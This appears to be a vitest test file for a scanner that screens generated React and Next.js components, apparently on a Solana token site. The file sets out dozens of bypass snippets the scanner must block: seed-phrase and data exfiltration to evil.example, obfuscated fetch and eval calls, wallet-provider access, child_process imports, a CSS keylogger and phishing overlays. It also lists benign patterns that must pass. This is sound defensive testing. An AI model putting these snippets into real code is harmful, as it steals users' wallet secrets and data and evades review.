import { describe, expect, it } from 'vitest';

import { scanComponent } from './test-helpers.js';

/** Attempts to get around the scan. Every one of them must be blocked. */
const attacks: Record<string, string> = {
  'React 19 preinit script': `import { preinit } from 'react-dom'; preinit('https://evil.example/x.js', { as: 'script' });`,
  'ReactDOM.preload': `import * as ReactDOM from 'react-dom'; ReactDOM.preload('https://evil.example/x.js', { as: 'script' });`,
  'createElement(Script)': `import Script from 'next/script'; import { createElement } from 'react'; export const C = () => createElement(Script, { src: 'https://evil.example/x.js' });`,
  'next/script namespace import': `import * as S from 'next/script'; export const C = () => <S.default src="https://evil.example/x.js" />;`,
  'next/script internals': `import Script from 'next/dist/client/script'; export const C = () => <Script src="https://evil.example/x.js" />;`,
  'seed phrase exfiltration via img src': `export const C = ({ seed }: { seed: string }) => <img src={\`https://evil.example/p.gif?d=\${seed}\`} />;`,
  'exfiltration via next/image': `import Image from 'next/image'; export const C = ({ s }: { s: string }) => <Image src={'https://evil.example/i?' + s} alt="" width={1} height={1} />;`,
  'exfiltration via inline style url()': `export const C = ({ s }: { s: string }) => <div style={{ backgroundImage: \`url(https://evil.example/b?\${s})\` }} />;`,
  'exfiltration via a dynamic link': `export const C = ({ s }: { s: string }) => <a href={\`https://evil.example/verify?k=\${s}\`}>Verify</a>;`,
  'exfiltration via new Audio': `export const f = (s: string) => new Audio('https://evil.example/a?' + s);`,
  'exfiltration via new Image().src': `export const f = (s: string) => { const i = new Image(); i.src = 'https://evil.example/?' + s; };`,
  'exfiltration via form action': `export const C = () => <form action="https://evil.example/collect"><input name="seed" /></form>;`,
  'phishing iframe overlay': `export const C = () => <iframe src="https://evil-clone.example" style={{ position: 'fixed', inset: 0 }} />;`,
  'base element hijack': `export const C = () => <base href="https://evil.example/" />;`,
  'window via defaultView': `export const f = (k: string) => document.defaultView![k as any];`,
  'window via iframe contentWindow': `export const f = (el: HTMLIFrameElement) => el.contentWindow!.eval('1');`,
  'property name built at runtime': `export const f = (w: any) => w[['s', 'o', 'l', 'a', 'n', 'a'].map((c) => c).join('')];`,
  'aliasing window through Object.values': `export const f = () => Object.values(window);`,
  'globalThis alias': `const g = globalThis; export default g;`,
  'location.replace through window': `window.location.replace('https://evil.example');`,
  'top.location': `top!.location.href = 'https://evil.example';`,
  'location.host assignment': `location.host = 'evil.example';`,
  'destructured fetch': `const { fetch: f } = window; f('https://evil.example');`,
  'fetch through bind': `const f = fetch.bind(window); f('https://evil.example');`,
  'computed destructuring of a wallet method': `export const f = (w: any) => { const { ['sign' + 'Transaction']: s } = w; return s; };`,
  'injected provider via computed key': `export const f = () => (window as any)['pha' + 'ntom'].solana;`,
  'WebRTC exfiltration': `export const p = new RTCPeerConnection();`,
  'import of a node built-in through require': `export const cp = require('child_process');`,
  'require aliasing': `const r = require; export const cp = r('child_process');`,
  'dynamic require': `export const load = (m: string) => require(m);`,
  'getServerSideProps leaking env': `export const getServerSideProps = () => ({ props: { k: process.env.JUPITER_API_KEY } });`,
  'globalThis.process': `export const e = (globalThis as any).process.env;`,
  'redirect header in getServerSideProps': `export const getServerSideProps = ({ res }: any) => { res.writeHead(302, { Location: 'https://evil.example' }); res.end(); return { props: {} }; };`,
  'meta refresh with dynamic http-equiv': `const H = 'ref' + 'resh'; export const C = () => <meta httpEquiv={H} content="0;url=https://evil.example" />;`,
  'setAttribute onload': `export const f = (el: Element) => el.setAttribute('on' + 'load', 'alert(1)');`,
  'setAttribute src': `export const f = (el: Element) => el.setAttribute('src', 'https://evil.example/x.js');`,
  insertAdjacentHTML: `export const f = (el: Element, s: string) => el.insertAdjacentHTML('beforeend', s);`,
  'outerHTML through computed key': `export const f = (el: any, s: string) => { el['outer' + 'HTML'] = s; };`,
  'polymorphic tag set to script': `export const C = ({ as: Tag = 'div' }: any) => <Tag />; export const D = () => <C as="script" />;`,
  'Function via constructor property': `export const f = () => (() => {}).constructor('return 1')();`,
  'eval through globalThis computed': `(globalThis as any)[String.fromCharCode(101, 118, 97, 108)]('1');`,
  'Reflect.apply on fetch': `Reflect.apply(fetch, window, ['https://evil.example']);`,
  WebAssembly: `WebAssembly.instantiate(new Uint8Array([0]));`,
  'service worker via computed key': `(navigator as any)['service' + 'Worker'].register('/x.js');`,
  'URL in an object constant': `const CFG = { api: 'https://evil.example' }; fetch(CFG.api + '/x');`,
  'URL returned by a function': `const api = () => 'https://evil.example/x'; fetch(api());`,
  'URL built with base64': `fetch(atob('aHR0cHM6Ly9ldmlsLmV4YW1wbGUveA=='));`,
  'URL built with fromCharCode': `fetch(String.fromCharCode(104,116,116,112,115,58,47,47,101,118,105,108,46,101,120,97,109,112,108,101,47));`,
  'URL built with decodeURIComponent': `fetch(decodeURIComponent('https%3A%2F%2Fevil.example%2F'));`,
  'self-origin suffix trick': `fetch(\`\${window.location.origin}.evil.example/x\`);`,
  'new URL with external base': `export const u = (p: string) => fetch(new URL(p, 'https://evil.example'));`,
  'Request object': `fetch(new Request('https://evil.example/x'));`,
  'eval in a type-looking position': `export const x: typeof eval = eval;`,
  'CSS keylogger in a <style> element': `export const C = () => <style>{'input[value^="a"] { background: url(https://evil.example/a); }'}</style>;`,
  'external @import in styled-jsx':
    'export const C = () => <style jsx global>{`@import url("https://evil.example/x.css");`}</style>;',
  'escaped identifier fetch': `\\u0066etch('https://evil.example');`,
};

describe('bypass attempts', () => {
  for (const [name, src] of Object.entries(attacks)) {
    it(`blocks: ${name}`, () => {
      expect(scanComponent(src), src).not.toEqual([]);
    });
  }
});

/** Legitimate patterns that must stay allowed (false-positive guard). */
const legit: Record<string, string> = {
  'static external image': `export const C = () => <img src="https://images.example-cdn.com/banner.png" alt="" />;`,
  'local image with dynamic path': `export const C = ({ id }: { id: string }) => <img src={\`/coins/\${id}.png\`} alt="" />;`,
  'next/image from the R2 host': `import Image from 'next/image'; export const C = ({ k }: { k: string }) => <Image src={\`https://media.forge.example/\${k}\`} alt="" width={64} height={64} />;`,
  'dynamic internal link': `import Link from 'next/link'; export const C = ({ m }: { m: string }) => <Link href={\`/coin/\${m}\`}>Open</Link>;`,
  'dynamic explorer link': `export const C = ({ m }: { m: string }) => <a href={\`https://solscan.io/token/\${m}\`}>Solscan</a>;`,
  'inline style with a local background': `export const C = ({ n }: { n: string }) => <div style={{ backgroundImage: \`url(/bg/\${n}.webp)\` }} />;`,
  'array index access': `export const pick = (xs: string[], i: number) => xs.at(i) ?? xs.at(i + 1) ?? xs[0] ?? xs[xs.length - 1];`,
  'theme lookup by key': `const theme: Record<string, string> = { a: '#fff' }; export const c = (k: string) => theme[k];`,
  'typeof window guard': `export const isBrowser = typeof window !== 'undefined' && 'IntersectionObserver' in window;`,
  'window event listeners': `export const on = (f: () => void) => { window.addEventListener('resize', f); return () => window.removeEventListener('resize', f); };`,
  'scroll to top': `export const top = () => window.scrollTo({ top: 0, behavior: 'smooth' });`,
  'reading location': `export const here = () => window.location.href + location.search;`,
  'local state named open and location': `import { useState } from 'react'; export function M({ location }: { location: string }) { const [open, setOpen] = useState(false); return <div onClick={() => setOpen(!open)}>{location}</div>; }`,
  'next/script with an allowed host': `import Script from 'next/script'; export const A = () => <Script src="https://va.vercel-scripts.com/v1/script.js" strategy="afterInteractive" />;`,
  'type-only imports': `import type { ReactNode } from 'react'; export type P = { children: ReactNode; onClick?: Function };`,
  'local CSS in a <style> element': `export const C = () => <style>{'.hero { background: url(/images/hero.webp); }'}</style>;`,
  'framer-motion style element': `import { motion } from 'framer-motion'; export const C = () => <motion.div animate={{ opacity: 1 }} />;`,
};

describe('legitimate design code', () => {
  for (const [name, src] of Object.entries(legit)) {
    it(`allows: ${name}`, () => {
      expect(scanComponent(src, { r2PublicHost: 'media.forge.example' })).toEqual([]);
    });
  }
});
